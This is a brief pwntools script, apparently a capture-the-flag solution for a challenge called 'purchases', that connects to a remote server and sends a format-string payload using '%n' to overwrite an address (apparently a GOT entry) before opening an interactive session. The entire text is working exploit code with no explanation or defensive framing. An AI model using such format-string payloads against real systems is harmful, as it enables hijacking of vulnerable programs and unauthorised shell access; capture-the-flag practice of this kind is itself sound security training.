from pwn import *
s=remote("shell.actf.co",19011)
#s=process("./purchases")
s.recvuntil("purchase? ")
#gdb.attach(s)
payload="%4198831caaaaaaa"+"%12$naaa"+p64(0)+p64(0x404018)
s.sendline(payload)
s.interactive()
